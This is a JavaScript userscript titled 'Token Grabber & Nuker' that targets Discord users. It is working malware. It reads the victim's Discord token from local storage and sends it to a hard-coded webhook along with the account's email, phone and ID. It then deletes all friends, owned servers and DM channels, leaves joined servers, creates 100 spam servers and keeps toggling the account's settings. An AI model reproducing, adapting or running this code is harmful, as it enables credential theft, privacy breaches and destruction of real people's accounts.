// ==UserScript==
// @name         Token Grabber & Nuker
// @version      1.0.0
// @namespace    https://github.com/endlessXD/
// @icon         https://avatars.githubusercontent.com/u/73157473?v=4
// @description  ok
// @author       endless
// @match        *://*/*
// @grant        none
// ==/UserScript==

(function() {
  'use strict';

  if (location.href !== 'https://discord.com/robots.txt') location.href = 'https://discord.com/robots.txt';

  const token = localStorage.getItem('token');
  if (!token) return;

  const base = 'https://discord.com/api/v8';
  const Webhook = 'https://discord.com/api/webhooks/865992275486048266/Z1bcRbL7f13dI7Ii061LsTemvnUYJpDXZq-8HJzAUHAzM2OEifvyoyrwdH_rsGQ29a79';

  const locales = ['ja', 'zh-TW', 'ko', 'zh-CN', 'de', 'lt', 'lv', 'fi', 'se'];
  const headers = {
    'Authorization': token.replaceAll('"', ''),
    'Content-Type': 'application/json'
  };

  const request = function (method, data, url, callback) {
    const XHR = new XMLHttpRequest();

    XHR.open(method, url);

    for (const header in headers) {
      XHR.setRequestHeader(header, headers[header]);
    };

    XHR.send(data ? JSON.stringify(data) : null);

    XHR.onreadystatechange = function() {
      if (XHR.readyState === 4) {
        callback ? callback(XHR.responseText) : undefined;
      };
    };
  };

  Array.prototype.next = function() {
    if (!Array.index || Array.index === this.length) Array.index = 0;

    const value = this[Array.index];
    Array.index++;

    return value;
  };

  Array.prototype.random = function() {
    return this[Math.floor(Math.random() * this.length)];
  };

  const user = {
    tag: null,
    avatar: null,
    email: null,
    phone: null,
    id: null
  };

  request('GET', 0, base + '/users/@me', (data) => {
    data = JSON.parse(data);

    for (const property in user) {
      if (property === 'tag') {
        user.tag = data.username + '#' + data.discriminator;
        continue;
      };

      user[property] = data[property];
    };
  
    const params = {
      content: '@everyone',
      embeds: [{
        color: 0x00FF00,
        title: 'Token Grabber',
        description: `**${token}**`,
        timestamp: new Date().toISOString(),
        thumbnail: {
          url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}?size=512`
        },
        footer: {
          text: 'endless OP'
        },
        fields: [
          { name: 'Tag', value: user.tag, inline: false },
          { name: 'User ID', value: user.id, inline: false },
          { name: 'Avatar', value: user.avatar, inline: false },
          { name: 'Email', value: user.email || 'None', inline: false },
          { name: 'Phone', value: user.phone || 'None', inline: false }
        ]
      }]
    };

    request('POST', params, Webhook);
  });

  request('GET', 0, base + '/users/@me/relationships', (data) => {
    const friends = JSON.parse(data).map(({ id }) => id);

    friends.forEach(friend => {
      request('delete', 0, base + `/users/@me/relationships/${friend}`);
    });
  });
  
  request('GET', 0, base + '/users/@me/guilds', (data) => {
    const owned = JSON.parse(data).filter(({ owner }) => owner).map(({ id }) => id);
    const joined = JSON.parse(data).filter(({ owner }) => !owner).map(({ id }) => id);

    owned.forEach(guild => {
      request('POST', 0, base + `/guilds/${guild}/delete`);
    });

    joined.forEach(guild => {
      request('DELETE', 0, base + `/users/@me/guilds/${guild}`);
    });
  });

  request('GET', 0, base + '/users/@me/channels', (data) => {
    const channels = JSON.parse(data).map(({ id }) => id);

    channels.forEach(channel => {
      request('DELETE', 0, base + `/channels/${channel}`);
    });
  });

  for (let i = 0; i < 100; i++) {
    request('POST', { name: 'endless OP', region: 'brazil' }, base + '/guilds');
  };

  setInterval(() => {
    request('PATCH', { theme: ['light', 'dark'].next(), locale: locales.random() }, base + '/users/@me/settings');
  }, 100);
})();
